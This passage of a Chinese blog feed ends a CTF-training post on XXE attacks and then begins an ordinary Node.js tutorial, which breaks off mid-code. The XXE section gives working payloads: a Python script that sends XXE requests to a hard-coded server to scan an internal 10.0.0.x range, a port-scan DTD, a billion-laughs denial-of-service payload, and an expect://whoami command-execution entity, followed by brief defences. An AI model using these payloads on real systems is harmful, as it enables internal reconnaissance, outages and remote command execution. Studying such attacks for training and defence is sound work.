class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>    send_xml(xml)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_xml</span>(<span class="hljs-params">xml</span>):</span><br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    x = requests.post(<span class="hljs-string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>    coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>] <span class="hljs-comment"># a little split to get only the base64 encoded value</span><br>    <span class="hljs-built_in">print</span> coded_string<br><span class="hljs-comment">#   print base64.b64decode(coded_string)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">try</span>:<br>        i = <span class="hljs-built_in">str</span>(i)<br>        ip = <span class="hljs-string">&#x27;10.0.0.&#x27;</span> + i<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        <span class="hljs-built_in">print</span> string<br>        build_xml(string)<br>    <span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>端口扫描</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">data</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://127.0.0.1:i/&quot;</span> [</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>爆破i</p><h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>产生3G左右的垃圾文档，使服务器宕机</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;?xml version=&quot;<span class="hljs-number">1.0</span>&quot;?&gt;</span><br>     <span class="hljs-params">&lt;!DOCTYPE lolz [</span><br><span class="hljs-params">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol2 &quot;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol3 &quot;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol4 &quot;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol5 &quot;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol6 &quot;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol7 &quot;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol8 &quot;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol9 &quot;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;&quot;&gt;</span><br>     ]&gt;<br>     <span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span>;<span class="hljs-params">&lt;/lolz&gt;</span><br></code></pre></td></tr></table></figure><p>在Unix中，使用/dev/random文件内容代替实体，则用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><p>在开启了expect扩展的情况下，可以执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>1.禁用外部实体</p><blockquote><p>libxml_disable_entity_loader(true)</p></blockquote><p>2.过滤非法输入</p><p>匹配关键字<code>&lt;!DOCTYPE &lt;!ENTITY SYSTEM PUBLIC</code></p><p>3.禁止外部实体的解析</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs&amp;原型链污染</title>
    <link href="/2021/11/22/nodejs&amp;Prototype-Pollution-Attack/"/>
    <url>/2021/11/22/nodejs&amp;Prototype-Pollution-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>DOM</code>（一些操作页面元素的方法）</li><li><code>BOM</code>（一些操作浏览器的方法）</li></ul><p>上面是<code>JavaScript</code>的组成部分，那么<code>Nodejs</code>呢？</p><p><strong>Nodejs</strong>：</p><ul><li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li><li><code>os</code>(操作系统)</li><li><code>file</code>(文件系统)</li><li><code>net</code>(网络系统)</li><li><code>database</code>(数据库)</li></ul><p>简单的说 Node.js 就是运行在服务端的 JavaScript。</p><p>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</p><p>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p><p>安装、环境配置略</p><h2 id="一、运行脚本"><a href="#一、运行脚本" class="headerlink" title="一、运行脚本"></a>一、运行脚本</h2><p>（ 略）<br>目的：编写简单的一个脚本并运行 了解nodejs</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#保存为helloworld.js文件</span><br></code></pre></td></tr></table></figure><p>终端到此目录，<code>node helloworld.js</code></p><p>查找命令node -h</p><h2 id="二、web服务器"><a href="#二、web服务器" class="headerlink" title="二、web服务器"></a>二、web服务器</h2><p>使用php编写后端代码后 部署需要Apache或Nginx 并且要有mod_php和php_cgi才能成功解析php</p><p>nodejs不仅能充当上述服务器的作用 还能实现一个应用</p><p>就上例而言 nodejs的应用由http模块、服务器、处理请求和发送响应</p><h3 id="①引入模块"><a href="#①引入模块" class="headerlink" title="①引入模块"></a>①引入模块</h3><p>使用require载入http模块 把实例化的HTTP服务赋值给变量http 其中require是nodejs自带的http模块<br><code>var http = require(&quot;http&quot;);</code></p><h3 id="②创建服务器"><a href="#②创建服务器" class="headerlink" title="②创建服务器"></a>②创建服务器</h3><p>在http模块中提供一函数creatServer，函数会返回一个对象 可以通过listen的方法截获</p><p>http.creatServe()方法创建服务器 listen 8080<br>在里面使用request和response来接收和响应</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//http头 状态码 内容类型</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//监听8080端口</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p>配合index.html</p><h2 id="三、npm"><a href="#三、npm" class="headerlink" title="三、npm"></a>三、npm</h2><p>npm是nodejs的包管理工具 新版的nodejs已经带有npm<br>但通常要升级<code>npm install npm -g(全局安装)</code><br>也需要配置镜像<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>安装模块分为本地安装和全局安装</p><ul><li><p>本地安装</p><ol><li>将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</li><li>可以通过 require() 来引入本地安装的包。 </li></ol></li><li><p>全局安装</p><ol><li>将安装包放在 /usr/local 下或者你 node 的安装目录。</li><li>可以直接在命令行里使用。</li></ol></li></ul><p>卸载<code>npm uninstall npm</code><br>升级<code>npm update npm</code><br>查看安装信息<code>npm list -g</code><br>搜索模块<code>npm search npm</code></p><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>首先来看一个包的json 位于node_modules/npm的package.json<br>可以看到有</p><pre><code>name - 包名。version - 包的版本号。description - 包的描述。homepage - 包的官网 url 。author - 包的作者姓名。contributors - 包的其他贡献者姓名。dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。main - main 字段指定了程序的主入口文件，require(&#39;moduleName&#39;) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。keywords - 关键字</code></pre><p>npm init(目录下无package.json 否则会修改当前的package.json文件)<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/npminit.png"></p><p>接着使用npm来发布模块(不演示)</p><ul><li><input checked="" disabled="" type="checkbox"> 首先在npm资源库注册用户<code>npm adduser</code></li><li><input checked="" disabled="" type="checkbox"> 发布<code>npm publish</code></li></ul><h2 id="四、REPL-nodejs解释器"><a href="#四、REPL-nodejs解释器" class="headerlink" title="四、REPL nodejs解释器"></a>四、REPL nodejs解释器</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/PERl.png"><br>查看REPL命令 <code>.help</code></p><p>可以不声明变量 但会直接输出<br>_下划线可以截取上一表达式的运算结果<br>可以键入变量名输出值 也能使用console.log函数<br>node中ctrl+c一次退出当前 两次退出解释器 ctrl+d直接退出解释器</p><h2 id="五、回调函数与事件循环"><a href="#五、回调函数与事件循环" class="headerlink" title="五、回调函数与事件循环"></a>五、回调函数与事件循环</h2><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>先来看两个例子</p><ul><li>阻塞 1.js</li></ul><p> <code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p><p>读取完文件 执行程序</p><ul><li>非阻塞 2.js</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>读取文件的同时执行后面的代码 因此提高了程序的性能 从而我们可以把需要处理回调函数的参数写在回调函数内</p><p>即 <strong>阻塞是按顺序执行代码的 非阻塞可以不按照顺序执行</strong></p><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>Node.js 异步编程的直接体现就是回调。</p><p>异步编程依托于回调来实现 但不能说使用了回调后程序就异步化了 </p><p>nodejs是单线程应用程序 而V8引擎提供的异步执行回调接口就可以处理大量的并发 从而极大的提升了性能</p><p>nodejs的几乎每个API接口都支持回调函数 所有事件均是上帝视角 当事件被检测到就会触发回调函数<br>Node.js 使用事件驱动模型，webserver一直接收请求而不等待读写操作（非阻塞式IO或事件驱动IO） 然后去服务下一个web请求 当这个请求完成 它被放回处理队列 当到达队列开头 这个结果被返回给用户 这种模型非常高效可扩展性也非常强<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/event_loop.jpg"></p><p>回到开头的引言 我们了解了回调函数以及事件循环 就能执行异步操作了<br>下面是 将执行异步操作的函数写在回调函数的最后一个参数中 回调函数接收错误对象则作为第一个参数</p><p>执行3.js-&gt;删除input.txt-&gt;执行3.js</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure><p>readFile函数读取文件，如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。<br>如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出，此时就是一次异步操作。</p><h2 id="六、EventEmitter"><a href="#六、EventEmitter" class="headerlink" title="六、EventEmitter"></a>六、EventEmitter</h2><p>events模块只提供events.EventEmitter,它是事件触发和事件监听的封装 EventEmitter对象中有多个属性on绑定事件函数 emit属性触发事件</p><p>event.js EventEmitter用法</p><p>event1.js体现如下</p><p> EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。</p><p>当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/EventEmitter.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>event实例.js 了解其他属性方法…</p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>一个事件发生错误时没有监听器时会报错 一般要对其设置error事件的监听器</p><h2 id="七、Buffer"><a href="#七、Buffer" class="headerlink" title="七、Buffer"></a>七、Buffer</h2><p>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</p><p>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// 输出 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// 输出 cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure><p>目前支持的字符编码ascii、utf8、utf16le、ucs2 - utf16le、base64、latin1、binary - latin1、hex</p><p>写入缓冲区</p><blockquote><p>buf.write(string[, offset[, length]][, encoding])</p></blockquote><p>从缓冲区读取</p><blockquote><p>buf.toString([encoding[, start[, end]]])</p></blockquote><p>将buffer转换为json对象</p><blockquote><p>buf.toJSON()</p></blockquote><p>合并缓冲区</p><blockquote><p>Buffer.concat(list[, totalLength])</p></blockquote><p>比较缓冲区</p><blockquote><p>buf.compare(otherBuffer);</p></blockquote><p>拷贝缓冲区</p><blockquote><p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p></blockquote><p>裁剪缓冲区</p><blockquote><p>buf.slice([start[, end]])</p></blockquote><p>计算缓冲区长度</p><blockquote><p>buf.length;</p></blockquote><h2 id="八、模块系统"><a href="#八、模块系统" class="headerlink" title="八、模块系统"></a>八、模块系统</h2><p>前面介绍过了 引入模块使用require+模块文件<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/require.jpg"><br>require接收http、fs等原生模块以及某路径下的文件模块，还有mod非原生模块</p><p>注意：require()不是全局的！</p><h2 id="九、函数"><a href="#九、函数" class="headerlink" title="九、函数"></a>九、函数</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><p>say是一个函数 execute函数的第一个参数就是say本身(不是它的返回值) 而say中有一个参数 所以用本地变量someFunction来传递变量</p><ul><li>匿名函数<br>  一般我们函数使用是先声明后定义使用<br>  即使我们不急着定义函数体 但在对应域前必须声明了 我们才能调用 而这我们可在函数体内——在参数表中使用本地变量someFunction 在函数体内直接使用 甚至都不用给函数名字 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="十、路由"><a href="#十、路由" class="headerlink" title="十、路由"></a>十、路由</h2>url请求 GET POST参数在前面搭建简单应用时没有提及 作为后端处理这些请求就要有相应的服务器的功能<br>router下有个index.js文件 里面可以设置数据库 引入其他模块 同样可以写一个服务的serve.js 引入http url等模块 启动后充当服务器<br>然后用到一个router.js的文件 写一个路由函数作为参数传给server.js<br>至此可以访问url </li></ul><h2 id="十一、全局变量"><a href="#十一、全局变量" class="headerlink" title="十一、全局变量"></a>十一、全局变量</h2><p>列出一丢丢：</p><p>_filename 当前脚本文件名 输出其绝对路径</p><p>_dirname 当前脚本所在路径</p><p>setTimeout(function(),ms) 全局函数 在指定毫秒后执行一次函数</p><p>clearTimeout(t) 清除setTimeout()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 两秒后执行以上函数</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// 清除定时器</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure><p>setlnterval(function(),ms)<br>clearlnterval(t)<br>和上面的两个一样 不同的是 setlntercal会一直调用函数 直至clearlnterval调用或窗口关闭</p><p>process是global的属性 也是全局变量有四个事件<br>exit before uncaughException Signal</p><h2 id="十二、文件-异步"><a href="#十二、文件-异步" class="headerlink" title="十二、文件-异步"></a>十二、文件-异步</h2><p>导入文件系统模块<br><code>var fs = require(&quot;fs&quot;)</code></p><ul><li>读取input.txt<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;异步读取: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul><p>类似地有函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">打开<br>fs<span class="hljs-selector-class">.open</span>(path, flags<span class="hljs-selector-attr">[, mode]</span>, callback)<span class="hljs-comment">//(flags:r r+ a a+ ......)</span><br><br>写入<br>fs<span class="hljs-selector-class">.writeFile</span>(file, data<span class="hljs-selector-attr">[, options]</span>, callback)<br><br>读取<br>fs<span class="hljs-selector-class">.read</span>(fd, buffer, offset, length, <span class="hljs-attribute">position</span>, callback)<br><br>关闭<br>fs<span class="hljs-selector-class">.close</span>(fd, callback)<br><br>删除 <br>fs<span class="hljs-selector-class">.unlink</span>(path, callback)<br><br>还有目录...<br></code></pre></td></tr></table></figure><h2 id="十三、GET-POST请求"><a href="#十三、GET-POST请求" class="headerlink" title="十三、GET/POST请求"></a>十三、GET/POST请求</h2><p>获取get请求的参数</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">var</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br> <br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain; 